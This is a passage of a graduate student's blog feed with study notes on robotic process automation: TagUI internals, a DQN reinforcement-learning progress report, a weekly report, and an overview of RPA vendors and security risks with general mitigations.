        <content type="html"><![CDATA[<p>idea：</p><ol><li>RPA进程与AI的融合，非BPA那种与业务进行结合</li></ol><h3 id="tagui运行背后的技术支持"><a href="#tagui运行背后的技术支持" class="headerlink" title="tagui运行背后的技术支持"></a>tagui运行背后的技术支持</h3><p><img src="http://files.shanqianche.cn/202156/1620314243708.png" alt="技术支持"></p><ol><li>Automation Flow:作为一种flow 编辑工具，集成在tagui中，允许TagUi可以通过本地文件，在线文件甚至url获取业务流程；</li></ol><ul><li>同时可以通过命令，图表，url，API，email等方式传入参数</li></ul><ol start="3"><li>Chrome Extension 可以通过类似录视频的方式记录用户行为并创建业务流程</li><li>R&amp;Python 提供机器学习模块</li><li>Sikuli 图像识别处理</li><li>CasperJS测试集成工具</li></ol><h3 id="关键技术组成"><a href="#关键技术组成" class="headerlink" title="关键技术组成"></a>关键技术组成</h3><ul><li>SikuliX 用于图像标记、追踪功能</li><li>phantomJs 是一种轻量级脚本语言（环境简单）</li><li>casperjs中基于PhantomJS和SlimerJS的导航脚本和测试工具，包函了对于一些对于网页的基本操作的工具</li><li>SlimerJS与phantomjs类似，互相补充</li></ul><h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><ul><li>end_process: 通过扫描进程，按顺序杀死进程比Ctrl+C更加安全可靠</li><li>erina:==与tagui——helper有关，暂时无法看懂 #009688==</li><li>sleep: 补充win10环境中对于进程延迟的控制</li><li>tagui：TagUI接受脚本和参数</li><li>tagui_chrome: 用于连接chrome，通过控制浏览器发送和接收数据</li><li>tagui_crontab: 运行tagui服务端tagui_service</li><li>tagui_footer: 输出当前网站的url和title</li><li>tagui_global: ==暂时不懂 #009688==</li><li>tagui_header: ==作为一个工具包 #009688==</li></ul><h3 id="功能实现详细阐述"><a href="#功能实现详细阐述" class="headerlink" title="功能实现详细阐述"></a>功能实现详细阐述</h3><ol><li>监控对应任务进程进行杀死【php,chrome,sikuli,python,r,tagui】</li><li>sss</li><li>在Windows环境中无法进程设置延时，所以通过ping.exe补充功能</li><li>tagui框架入口源码交易理解，不做详细分析</li><li>tagui_chrome主要是依赖Textalk实现与chrome并发通信,同时它集成了Sikuli，可以通过图像识别实现业务流程</li><li>通过监控服务端状态，运行或者重复运行tagui_service</li><li>利用casperJs抓取当前脚本的url和title</li><li>sss</li><li>sss</li></ol><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><p><a href="https://zhuanlan.zhihu.com/p/366304958">https://zhuanlan.zhihu.com/p/366304958</a><br><a href="https://github.com/kensoh/TagUI/tree/before_aisg">https://github.com/kensoh/TagUI/tree/before_aisg</a></p><h4 id="shell语言规范"><a href="#shell语言规范" class="headerlink" title="shell语言规范"></a>shell语言规范</h4><p><a href="https://www.cnblogs.com/zrmw/p/9625727.html">https://www.cnblogs.com/zrmw/p/9625727.html</a></p><p><a href="https://blog.csdn.net/weixin_37766087/article/details/99974385">https://blog.csdn.net/weixin_37766087/article/details/99974385</a></p><h4 id="curl工具"><a href="#curl工具" class="headerlink" title="curl工具"></a>curl工具</h4><p><a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">https://www.ruanyifeng.com/blog/2019/09/curl-reference.html</a></p><h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><p><a href="https://blog.csdn.net/shenhuan1104/article/details/75852822">https://blog.csdn.net/shenhuan1104/article/details/75852822</a></p><p>grep -iq 404 ，匹配到404，则返回1；反之</p><h4 id="业务流程模型（BPMN）"><a href="#业务流程模型（BPMN）" class="headerlink" title="业务流程模型（BPMN）"></a>业务流程模型（BPMN）</h4><h4 id="流程引擎"><a href="#流程引擎" class="headerlink" title="流程引擎"></a>流程引擎</h4><p>CasperJS + PhantomJS==》Puppeteer + Node.js引擎</p><p><a href="https://blog.csdn.net/qq_38941937/article/details/110296665">https://blog.csdn.net/qq_38941937/article/details/110296665</a></p><h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><ol><li>流式无并行</li></ol><h4 id="开题失败—题目比较无实际意义"><a href="#开题失败—题目比较无实际意义" class="headerlink" title="开题失败—题目比较无实际意义"></a>开题失败—题目比较无实际意义</h4><p><img src="./attachments/RPA%E5%8A%A8%E6%80%81%E6%84%9F%E7%9F%A5%E5%88%86%E9%85%8D%E4%B8%9A%E5%8A%A1%E8%B5%84%E6%BA%90%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%BA%94%E7%94%A8.pptx" alt="RPA动态感知分配业务资源的研究与应用"></p>]]></content>
      
      
      <categories>
          
          <category> RPA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> RPA </tag>
            
            <tag> code </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小论文阶段性报告</title>
      <link href="/2021/04/25/%E5%B0%8F%E8%AE%BA%E6%96%87%E9%98%B6%E6%AE%B5%E6%80%A7%E6%8A%A5%E5%91%8A/"/>
      <url>/2021/04/25/%E5%B0%8F%E8%AE%BA%E6%96%87%E9%98%B6%E6%AE%B5%E6%80%A7%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input checked="" disabled="" type="checkbox"> 数据处理</li><li><input checked="" disabled="" type="checkbox"> 构建虚拟环境</li><li><input disabled="" type="checkbox"> 搭建模型，进行初步运行</li><li><input checked="" disabled="" type="checkbox"> 学习已有模型</li></ul><h1 id="DONE"><a href="#DONE" class="headerlink" title="DONE"></a>DONE</h1><p>1、数据方面前几周已经处理完成，主要时间花费在对于数据中结点直接的关系进行梳理，主要元素来自于9个页面和若干个弹窗，总共数据有约一百个结点信息组成。<br>2、深度增强学习中如何能够快速找到最优动作会大大缩短训练时间，获得最大q值，所以通过将同层元素聚集在一起，实现Agent以最小代价寻找到合适动作，我通过将数据绑定到Gosper曲线结点上，满足同层元素在二维空间上聚集，然后在此基础上根据离散点的分布位置画出泰森多边形，这样就可以凸显出各模块元素特征，最后通过颜色以及结点之间关系可以之间凸显示出元素关系。这部分是环境的显示部分。</p><p><img src="http://files.shanqianche.cn/20224/1650860851444.png" alt="结点数据"></p><p><img src="http://files.shanqianche.cn/20224/1650865770175.png" alt="Goper生成规则"></p><p><img src="http://files.shanqianche.cn/20224/1650865873956.png" alt="代码中实现"></p><p><img src="http://files.shanqianche.cn/20224/myplot1.png" alt="Gosper曲线"></p><p><img src="http://files.shanqianche.cn/20224/myplot3.png" alt="绑定曲线后，隐藏掉曲线"></p><p><img src="http://files.shanqianche.cn/20224/1650867119647.png" alt="局部约束"></p><p><img src="http://files.shanqianche.cn/20224/myplot4.png" alt="根据数据离散点生成泰森多边形"></p><p><img src="http://files.shanqianche.cn/20224/voro.png" alt="去掉无用元素生成环境图"></p><p>3、第三阶段是环境构建agent的动作以及环境反馈。主要工作在于动作，以及规则的写入，状态空间的构建,以及历史动作的保存以及读取</p><p><img src="http://files.shanqianche.cn/20224/VeryCapture_20220425124642.gif" alt="动作空间，奖惩，状态空间构建完成"></p><p>4、构建深度增强模型，baseline模型DQN。目前状态空间由4x2的矩阵存储最近四步动作来表示，同时使用一维3*7矩阵作为离散动作空间。这里主要是优化大论文中第一个创新点，结合使用第二个创新点的思想。</p><p><img src="http://files.shanqianche.cn/20224/1650866999994.png" alt="大论文，创新点一"></p><p><img src="http://files.shanqianche.cn/20224/1650867028297.png" alt="大论文，创新点二"></p><h1 id="NEED-NEXT-STEP"><a href="#NEED-NEXT-STEP" class="headerlink" title="NEED NEXT STEP"></a>NEED NEXT STEP</h1><p>1、目前baseline还需要调试<br>2、为每个结点加入添加判断，以满足实际需求<br>3、优化模型，以图片方式当如为状态，进行训练比对。</p><h1 id="验证与改进"><a href="#验证与改进" class="headerlink" title="验证与改进"></a>验证与改进</h1><p>状态表示不学习，恶婆塞鲁值学习慢，超参数实验未向目标移动值奖励很大【值设置】，问题依旧有【奖励设置】，多模型学习，学习后期后奖励下降，创新</p><p>1、修改环境，一开始通过连续四个位置信息构建的状态空间，经过多次训练（1000yinei）后发现，agent很难记到</p><h2 id="实验进行一《距离为四》"><a href="#实验进行一《距离为四》" class="headerlink" title="实验进行一《距离为四》"></a>实验进行一《距离为四》</h2><h3 id="实验第一次"><a href="#实验第一次" class="headerlink" title="实验第一次"></a>实验第一次</h3><p><img src="http://files.shanqianche.cn/20225/1651806092845.png" alt="参数1"></p><p><img src="http://files.shanqianche.cn/20225/1651806113103.png" alt="参数二"></p><p><img src="http://files.shanqianche.cn/20225/1651806154911.png" alt="参数三"></p><h4 id="DDQN"><a href="#DDQN" class="headerlink" title="DDQN"></a>DDQN</h4><p><img src="http://files.shanqianche.cn/20225/1651806365863.png" alt="理想一"></p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-04-12【Week】</title>
      <link href="/2021/04/12/2021-04-12%E3%80%90Week%E3%80%91/"/>
      <url>/2021/04/12/2021-04-12%E3%80%90Week%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h2 id="本周安排"><a href="#本周安排" class="headerlink" title="本周安排"></a>本周安排</h2><ul><li><input disabled="" type="checkbox"> MIT6.003要听四节课程</li><li><input checked="" disabled="" type="checkbox"> 阅读并总结论文</li></ul><blockquote><p>Automated Discovery of Data Transformations for Robotic Process Automation</p></blockquote><ul><li><input checked="" disabled="" type="checkbox"> 阅读 “Robotic Process Automation (RPA) and Security ”制定一份RPA系统配置计划书</li><li><input checked="" disabled="" type="checkbox"> 完成RPA总结</li><li><input disabled="" type="checkbox"> 搭建实验室论坛</li><li><input disabled="" type="checkbox"> 完成小论文框架</li></ul><p><strong>后期补充</strong></p><ul><li><input checked="" disabled="" type="checkbox"> 帮涛总完成数据库整理</li><li><input checked="" disabled="" type="checkbox"> 确定基本RPA系统的组成</li></ul><h2 id="完成情况"><a href="#完成情况" class="headerlink" title="完成情况"></a>完成情况</h2><p><strong>任务完成</strong></p><ol><li>MIT6.003只听完第一节课，英语讲需要字幕反复听；</li><li>两篇论文，第一篇是关于RPA在进行文档操作过程中数据转换的改进，这篇还没有细读，后面细读一下、第二篇是关于RPA可能存在的问题，只是一篇综述，没有实际建议</li><li>RPA总结也初步完成，包括给那几个本科生讲了一下，就当时情况看，他们确实没有多少了解，几位同学可能还需要一些项目培养一下编码能力，可能需要更多努力来完成比赛，同时对于比赛题目的确定也需要多多了解RPA的应用场景</li><li>实验室论坛这块准备先让新来的师弟试试呀，和他交流过，他对于网络这块比较擅长，但是对于服务器这块比较欠缺，目前他和邹瑞学习，正好可以锻炼一下，如果后期没有完成，我再完成</li><li>目前研究点基本明确，只是缺少一个对于RPA研究下去信心，资料少，人少，学习内容多，工程大，确实需要先把UiPath搭建起来，并研究通了才能有信息继续研究下去</li><li>小论文这块想的是，本来学硕要求变难了，在平时学习过程中就开始填充知识，尽可能的跟上戴师兄和陈剑秋师兄的脚步</li><li>周五上午的数据整理初步完成，当时整理只是整理了部分，涛总也只是催了几个数据库的整理，后续情况等下次涛总安排吧</li><li>周六周日的时间，调研了一下UiPath的搭建，确定了基本的需求和流程，准备下周准备资源并进行搭建</li></ol><p><strong>学习方面</strong></p><blockquote><p>主要精力集中在RPA的总结上了，通过梳理几个大型公司的RPA产品，确定了目前比较热门以及将会被推广的产品有点：</p></blockquote><ol><li>对于屏幕抓取的智能解决方案，通过AI自我修复流程，极低的降低了业务流程因因素抓取失败或因被其它相近元素干扰导致流程作业失败的机率</li><li>为用户提供一个可以用户可以自己训练AI的场景，让用户可以根据自己实际生产需求，训练出更符合自身的AI</li><li>视频录制业务流程，传统的录制由于对于元素的获取容易受到旁边元素干扰，而且对于未知问题处理能力极差，所有需要专门RPA开发员的，但是目前有个别公司推出了一个图像识别算法，大体意思是通过扫描页面元素树确定鼠标触碰元素，几乎达到无失误识别，同时加上AI修正流程功能，录制视频来创建业务流程的目的已经可以达到了。</li><li>还有一点是比较容易忽略的同时是很实际的，对于RPA的部署，本身RPA对于资源的消耗是比较大的，但是却是弹性的，所以比较难以控制RPA部署规模，有个别公司也提出了解决方案，就是，算法，bot，已经中台控制都是分开，分规模，分类别可选择的进行部署。</li></ol><p> <strong>论文方面</strong></p><ol><li>RPA相关的论文，除了一些综述已经找不到其它有价值的了，下一步可能更多去一些公司的论坛进行查看了</li><li>目前有两个点，一个是，通过大量阅读和对于各个公司的观察，发现他们的重心都放在与AI的结合，扩展使用场景，却回避了RPA安全的严重缺陷，可能他们的场景是公司内网吧，所以第一个研究点就是RPA中的安全传输或者RPA中bot的数字认证；第二个是大点，还未确定可能与第一点，就是寻找一个应用场景，RPA需要与场景结合，通用性太高就容易导致研究</li><li>为RPA场景做准备，会阅读一些与人工智能相关的论文</li></ol><h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><ol><li>学习资料已经只剩下框架的官方文档了，国内外的论文可以查到的都是一些综述了，后期只能查阅一些一些公司的讨论</li><li>对于UiPath的搭建进行了初步了解，RPA框架本身存在的问题就是无法容器化，这也是一个研究点，所以如果公司没用空的服务器，我只能在本地虚拟金进行尝试了，我今天在阿里云买了一个两核4G的服务器上进行搭建，发现内存不够，但是扩容需要钱太多了，就放弃了，下一步就在本地搭建RPA只能在本地进行尝试</li></ol><h2 id="后期安排"><a href="#后期安排" class="headerlink" title="后期安排"></a>后期安排</h2><ul><li><input disabled="" type="checkbox"> 提出一个较为可操作的部署方案，并在本地进行尝试并总结</li><li><input disabled="" type="checkbox"> 了解一下市场需求，构思一个RPA隐患会造成极大破坏的场景，提出解决方案</li><li><input disabled="" type="checkbox"> 查阅一些公司的技术思路，了解一下他们在安全这块的研究点及解决方案，目前我总结的有几点：<ol><li>如何最大化的职责分配保障业务安全并最小的避免对业务流程的干扰</li><li>如何有效的进行身份认证和凭证的发放与验证</li><li>是否可以通过数据加密有效保证安全，还待考虑！</li><li>日志监控这块研究一下，思路是构建一个日志记录追踪，类似微服务中的日志记录</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> weekly report </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> report </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> RPA </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RPA</title>
      <link href="/2021/03/28/what%E2%80%98s%20the%20mean%20of%20RPA/"/>
      <url>/2021/03/28/what%E2%80%98s%20the%20mean%20of%20RPA/</url>
      
        <content type="html"><![CDATA[<h2 id="RPA"><a href="#RPA" class="headerlink" title="RPA"></a>RPA</h2><h3 id="进化历史"><a href="#进化历史" class="headerlink" title="进化历史"></a>进化历史</h3><ol><li>上个世纪二十年代 亨利·福特，改革了工业生产方式，开启了工业时代，提出了对于处理重复工作的需求</li><li>1990-2000，计算机被广泛使用，用于处理办公，提出批处理脚本和触发器</li><li>2000-2015，VBA宏编程（EXCEL宏）和BPA</li><li>2015-2018，RPA模型创建成功，并投入使用</li><li>2019~，RPA+AI，即RPA4.0被推出，被大企业认可</li></ol><p>1.2. 反应了为了解决重复工作，提出了批处理事务<br>脚本自动化：在RPA技术出现之前，脚本自动化是企业自动化可选的比较靠谱自动化落地技术。用于解决最基础的几步任务自动化，技术的缺点是没有容错、任务管理、弱鸡的基于GUI的能力。商业上的优势是，几乎可以免费使用。<br>3. VBA编程语言的创建是为了解决办公中常遇到的重复性问题【简单化】、BPA（业务流程自动化）通过深度关注业务流程，集成所有相关应用程序来实现功能，业务的实现与程序耦合太重【复杂化】</p><p>目前给出三个区别：<br><strong>集成</strong>：BPA相较于RPA对于一个业务流程提出了更加全面、更加精确的解决方法，但是BPA是一种侵入性很强的整合形式。它用自己的软件对现有的系统进行大修，并实现自己的系统。RPA不会破坏现有的业务流程。【存在优缺点】<br><strong>工作流</strong>：RPA机器人访问桌面现有的用户界面并执行人工任务，但是目前大多数机器人无法进行决策。BPA中使用的工作流程更加复杂，使用单一的处理模型来创建集成多种系统的工作流程。这些系统彼此交换和提取信息，以实现任务自动化，这需要API和数据库访问。这需要对编码和开发的大量IT支持。【应用场景的不同，无优缺点之分】<br><strong>定价</strong>：BPA定价取决于公司的规模。还有其涉及到的业务的规模。UiPath(RPA龙头企业)更加使用RPA类型来定价。【站在技术方面，RPA更加灵活，也更加适用】<br>4. 通过集成现有的业务不紧破坏了已有业务，同时过度的耦合、高昂的成本和无法普遍推广，这些条件都指定了传统化业务自动化流程只能为大公司所用。<br>这个时候屏幕抓取技术的诞生就突破了传统BPA的过度耦合的问题，它不需要过度依赖以前的业务来获取和处理数据，同时自动化与管理工具（管理系统的版本，安装，卸载等）使得RPA更易于推广，最后一个就是AI的加入，它是解放人类双手的核心，它可以根据人类先前的判断来执行任务。<br>5. RPA4.0的提出 我们不仅要看到AI为RPA提供的红利，同时也要看到RPA技术对于AI技术发展的重要意义，RPA为AI技术的发展提供了手和脚，RPA作为AI技术与现实生活的连接器，扩大了AI技术的使用范围</p><h3 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h3><p>RPA的核心是通过自动化、智能化技术来“代替人”进行重复性、低价性、无需人工决策等固定性流程化操作，从而有效的提高工作效率，减少错误。</p><p>The main difference between software<br>robots and applications is the identity access<br>management (IAM) domain —  RPA instances<br>behave like an individual user. </p><h3 id="RPA进化四个阶段"><a href="#RPA进化四个阶段" class="headerlink" title="RPA进化四个阶段"></a>RPA进化四个阶段</h3><p><img src="http://files.shanqianche.cn/2021413/1618314304547.png" alt="四个阶段"></p><p>1：辅助性RPA（Assisted RPA）<br>　　在RPA 1.0阶段，作为“虚拟助手”出现的RPA，几乎涵盖了机器人自动化的主要功能，以及现有桌面自动化软件的全部操作。部署在员工PC机上，以提高工作效率。缺点则是难以实现端到端的自动化，成规模地应用还很难。<br>　　2：非辅助性RPA（Unassisted RPA）<br>　　在RPA 2.0阶段，被称为“虚拟劳动力”的RPA，主要目标即实现端到端的自动化，以及虚拟员工分级。主要部署在VMS虚拟机上，能够编排工作内容，集中化管理机器人、分析机器人的表现等。缺点则是对于RPA软件机器人的工作仍然需要人工的控制和管理。<br>　　3：自主性RPA（Autonomous RPA）<br>　　在RPA 3.0阶段，其主要目标是实现端到端的自动化和成规模多功能虚拟劳动力。通常部署在云服务器和SaaS上，特点是实现自动分级、动态负载平衡、情景感知、高级分析和工作流。缺点则是处理非结构化数据仍较为困难。<br>　　4：认知性RPA（Cognitive RPA）<br>　　RPA 4.0将是未来RPA发展的方向。开始运用人工智能、机器学习以及自然语言处理等技术，以实现非结构化数据的处理、预测规范分析、自动任务接受处理等功能。<br>　　目前，尽管大多数RPA软件产品，都还集中在2.0 - 3.0之间，但其发展已相当成熟，产品化程度亦是很高。一些行业巨头已经开始向RPA 4.0发起了探索。</p><h3 id="播放几个视频"><a href="#播放几个视频" class="headerlink" title="播放几个视频"></a>播放几个视频</h3><h3 id="扩展理解"><a href="#扩展理解" class="headerlink" title="扩展理解"></a>扩展理解</h3><p>轻量级IT，任何电子设备都可以被操控，<br>智能客服、智能家居，以及很多重复性较高、朝左流程固定的办公工作都可以被替代</p><h2 id="国内外现状"><a href="#国内外现状" class="headerlink" title="国内外现状"></a>国内外现状</h2><p>就国内外发展现状进行对比，全球五强RPA占有47%的市场，中国国产RPA目前智能更多被使用在能源、医疗、政务等一些领域。</p><h3 id="国内外"><a href="#国内外" class="headerlink" title="国内外"></a>国内外</h3><p><img src="http://files.shanqianche.cn/2021412/1618235359990.png" alt="国内外RPA"></p><p>国内主要厂商：来也科技、达观数据、云扩科技、艺赛旗、阿里云等<br>国外及世界领先的厂商：UiPath(免费社区版)、Blue Prism、Automation Anywhere</p><p>虽然国际RPA依旧扮演领导者和行业的规则的制定者，但是在各种新技术与RPA融合进程中，以及在生态建设成为RPA厂商主要竞争力的主流打法上，国产RPA并没有落后。甚至在一些方面，已经超越某些国外厂商。</p><p>可以通过近几年的融资金额和市场估值可以看出国产RPA也在蓬勃发展。</p><p><img src="http://files.shanqianche.cn/2021413/1618313802380.png" alt="2020年融资"></p><p><img src="http://files.shanqianche.cn/2021413/1618314424625.png" alt="近五年的投资事件"></p><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p><a href="https://zhuanlan.zhihu.com/p/275757075">https://zhuanlan.zhihu.com/p/275757075</a></p><h3 id="UiPath"><a href="#UiPath" class="headerlink" title="UiPath"></a>UiPath</h3><p><img src="http://files.shanqianche.cn/2021413/1618316991750.png" alt="UiPath服务器平台三层逻辑"></p><p>1）表示层<br>数据REST API端点<br>通知API<br>Web应用程序<br>2）Web服务层xiac<br>业务逻辑实现（下层为单个任务节点的实现提供服务，上层是bot根据任务队列，任务组成等多因素来控制任务执行）<br>3）持久层<br>弹性搜索<br>SQL服务器</p><p><img src="http://files.shanqianche.cn/2021413/1618317691754.png" alt="设计框架"></p><ol><li>开发人员在UiPath Studio中构建流程</li><li>使用Development Orchestrator和Quality Assurance Qrcheestrator对其进行测试；完成后，他们将工作流（未打包）签入uiatph中主UiProcess Library文件夹（在VCS上）</li><li>将工作流封装，并保存到QA，为本机专有使用</li><li>如果在测试期间发现任何问题，则重复上述步骤。</li><li>一旦所有的QA测试都通过了，包就被复制到生产环境（P包）</li><li>生产过程正在进行，由生产机器人运行</li></ol><ul><li><p>UiPath由studio（开发工具），Orchestrator（自动化云平台和监控平台），robot（运行已开发的机器人服务）组成</p></li><li><p>Robot分为Front Office Robot和Back Office Robot.缩写分别为FOR和BOR。 FOR需要手工启动。</p></li><li><p>BOR需要配合Orchestrator启动。</p></li><li><p>现在又分别叫Attended和Unattended：</p></li><li><p>Attended要有人照看，不能在电脑锁屏的状态下运行自动工作流</p></li><li><p>Unattended不用人工照看，可以在电脑锁屏的状态下运行自动工作流，由Orchestrator远程执行</p></li></ul><blockquote><p>Invokes Repository 调用（调用存储库）==公用部分，被多方调用 #00BCD4==<br>Reusable Code Library 可重用代码库</p></blockquote><p><img src="http://files.shanqianche.cn/2021413/1618320047098.png" alt="新版设计框架"></p><ul><li>提供免费社区版</li><li>产品线丰富，拓展了AI、process mining方面的能力</li><li>它提供了多种托管选项，例如云环境，虚拟机和终端服务</li><li>它支持各种Web和桌面应用程序</li><li>它支持自动登录功能来运行机器人</li><li>它包括可与 .Net，Java，Flash，PDF，Legacy，SAP配合使用的抓取解决方案，且准确性最高</li></ul><h3 id="阿里云RPA"><a href="#阿里云RPA" class="headerlink" title="阿里云RPA"></a>阿里云RPA</h3><p><img src="http://files.shanqianche.cn/2021413/1618321774264.png" alt="流程编辑器"></p><p><img src="http://files.shanqianche.cn/2021413/1618323038585.png" alt="整体结构"></p><p>阿里云RPA4.0采用主流C/S架构模式，前端客户端采用.net平台，基于Windows系统具有自主研发的SDK及各项功能，后端服务端采用Linux（CentOS）操作系统，提供各类后台服务和组件。</p><ul><li>对接阿里达摩院，NLP、OCR等人工智能能力深度整合，让机器人更智能</li><li>拥有丰富的SDK自动化模块，支持自定义SDK库</li><li>阿里云统一售后支持体系</li></ul><p><img src="http://files.shanqianche.cn/2021413/1618323129695.png" alt="场景"></p><h3 id="实在智能-章鱼数字员工"><a href="#实在智能-章鱼数字员工" class="headerlink" title="实在智能-章鱼数字员工"></a>实在智能-章鱼数字员工</h3><p>解决问题：<br>    - 用户可以根据自身需求指定AI套件<br>    - 通用AI能力精度不足</p><p><img src="http://files.shanqianche.cn/2021415/1618463061303.png" alt="AaaS架构"></p><ol><li>RPA与算法平台进行无缝衔接</li></ol><p><img src="http://files.shanqianche.cn/2021415/1618463296265.png" alt="与算法平台衔接"></p><p>【视频–实在智能】</p><ol start="2"><li>集群以及AI定制</li></ol><blockquote><p>不同的系统对于计算能力，内容，硬盘以及网络的要求是不同的，可以根据系统不同分集群部署，不如算法运行在GPU上，而小型数据中台选择数据库服务器集群等；同时用户可以根据自身要求，选择算法和算法服务集群。</p></blockquote><p><img src="http://files.shanqianche.cn/2021415/1618463370738.png" alt="根据用户需求定制"></p><ol start="3"><li>算法开发训练</li></ol><blockquote><p>集成传统BPA的优势，为当前业务提供更加精确的算法</p></blockquote><p><img src="http://files.shanqianche.cn/2021415/1618463186299.png" alt="算法开发训练"></p><p><strong>产品优势：</strong></p><blockquote><p>北斗****<br>1.传统的无锚点拾取，只能在简单场景<br>2.当页面中出现相同元素时通过附近元素进行判断并标识,选择不当容易导致流程失败<br>3.完全无感知的自动锚点选择，通过step-of-out图神经网络技术学习页面上的拓扑关系</p></blockquote><blockquote><p>神盾<br>通过监控流程，如果发生异常，则通过北斗自动修复元素来修正自动流程</p></blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NjE2NjQ0Ng==&mid=2247484934&idx=1&sn=d7d105996c81ac9af8a5567a6db799aa&chksm=ea930fc7dde486d137d60d0a013db9d2f7390c0b3876da95a47ef8b0f17857fbab6fa40bd17b&scene=21#wechat_redirect">开源框架</a></p><blockquote><p>魔镜</p></blockquote><p><img src="http://files.shanqianche.cn/2021415/1618464900207.png" alt="自动化开发"></p><p><img src="http://files.shanqianche.cn/2021415/1618464926504.png" alt="魔镜"></p><p>  目前各大公司对于RPA的使用多处于RPA2.0-RPA3.0之间，即需要RPA开发者介于，而魔镜这种通过视频与日志结合的开发模式将很大程度降低客户使用成本。</p><h3 id="框架总结"><a href="#框架总结" class="headerlink" title="框架总结"></a>框架总结</h3><p>RPA解决方案是依托于各类先进信息技术手段的虚拟劳动力，根据预先设定的程序操作指令对任务进行自动化处理，实现业务流程由机器人自动化处理。</p><p><strong>RPA能做的</strong></p><p><img src="http://files.shanqianche.cn/2021413/1618320374905.png" alt="可以满足我们的"></p><p><img src="http://files.shanqianche.cn/2021413/1618323364197.png" alt="新的行业标准"></p><ol><li>作为辅助甚至代替传统职工的工作软件，它需要员工的权限，但是却又脱离了系统的安全保障，这就造成了安全危机。<br>任子旭的对于网络安全和内部合规的提议：<br>对网络安全和内控合规的要求和约束时，主要是两个思路：<strong>遵从和自证清白</strong>。</li></ol><p><img src="http://files.shanqianche.cn/2021413/1618320690337.png" alt="保障安全"></p><ol start="2"><li>作为一个辅助软件，本身高效性的前提是与相对应的工作量对照的，这就需要在配置时根据公司业务量来取舍，防止资源被浪费</li><li>虚拟化和环境一致性。整个项目的交付过程中，并没有那么简单。我们要考虑空间环境、系统环境、程序适用、版本兼容等多个因素。</li></ol><p><img src="http://files.shanqianche.cn/2021413/1618320927712.png" alt="部署中的注意点"></p><h2 id="研究内容"><a href="#研究内容" class="headerlink" title="研究内容"></a>研究内容</h2><p>RPA到底可以发展到什么程度？</p><h3 id="可研究点"><a href="#可研究点" class="headerlink" title="可研究点"></a>可研究点</h3><h4 id="RPA-网络安全风险"><a href="#RPA-网络安全风险" class="headerlink" title="RPA 网络安全风险"></a>RPA 网络安全风险</h4><ol><li>滥用特权访问</li></ol><ul><li>攻击者可能能够危及机器人使用的管理员帐户。攻击者可以使用管理员帐户获得对敏感数据的访问权限</li><li>在离职之前，前员工可以编程机器人删除重要数据并中断业务流程</li></ul><ol start="2"><li>披露敏感数据</li></ol><ul><li>机器人开发人员可能会错误地编写BOT，以将高机密数据（例如信用卡信息）上传到公众通过Web访问的数据库。</li><li>机器人开发人员可以使用他或她的账户窃取业务其他服务信息</li></ul><ol start="3"><li>安全漏洞</li></ol><ul><li>虚拟机环境中可能存在安全漏洞，这是机器人运行的环境。</li><li>机器人开发人员编程机器人发送/接收敏感数据而不加密。此数据很脆弱，可以由攻击者利用</li></ul><ol start="4"><li>拒绝服务</li></ol><ul><li>一些不良的编程实践可以使机器人消耗所有虚拟机系统资源并导致虚拟机变得无响应，因此无法执行任何工作</li><li>虚拟机可能受到计划受到计划升级或网络维护的影响，可能导致中断损失。</li></ul><p><strong>应对策略</strong></p><ol><li>先进的职责分工，这就限制RPA用户只能执行分配给分配的任务，并且它们没有提升访问权限。同时也要限制代码开发人员与使用者的行为。</li></ol><p><img src="http://files.shanqianche.cn/2021414/1618390329616.png" alt="主要RPA角色"></p><ol start="2"><li>数字身份认证和凭证的发放与验证，大部分黑客攻击都是在凭据被损害后发起的。为了避免这种情况，就需要设置机器人为最小的特权角色，那么机器人只能执行它的设计，并且其用户角色不能用于执行其他功能</li><li>数据加密，保证数据在传输过程前被加密，以及作业完成后删除。</li><li>监视日志并在内部控件损坏时执行审计，机器人活动可用于监测异常行为并进行审计，以防问题存在问题。</li><li>在发布生产代码之前，需要先扫描代码的漏洞，可以通过一些工具实现，Dynamic Application Security Testing (DAST) 【动态应用安全测试】and Fortify. </li></ol><h4 id="业务流程转型，RPA部署的效率、评估和解决方案"><a href="#业务流程转型，RPA部署的效率、评估和解决方案" class="headerlink" title="业务流程转型，RPA部署的效率、评估和解决方案"></a>业务流程转型，RPA部署的效率、评估和解决方案</h4><h4 id="对于其他功能的聚合，如应用控制，OCR-桌面自动化，中央管理等"><a href="#对于其他功能的聚合，如应用控制，OCR-桌面自动化，中央管理等" class="headerlink" title="对于其他功能的聚合，如应用控制，OCR,桌面自动化，中央管理等"></a>对于其他功能的聚合，如应用控制，OCR,桌面自动化，中央管理等</h4><h4 id="分区平台的共享服务必然会被需求较小的公司需求"><a href="#分区平台的共享服务必然会被需求较小的公司需求" class="headerlink" title="分区平台的共享服务必然会被需求较小的公司需求"></a>分区平台的共享服务必然会被需求较小的公司需求</h4><h4 id="跨平台的应用操作能力"><a href="#跨平台的应用操作能力" class="headerlink" title="跨平台的应用操作能力"></a>跨平台的应用操作能力</h4><h4 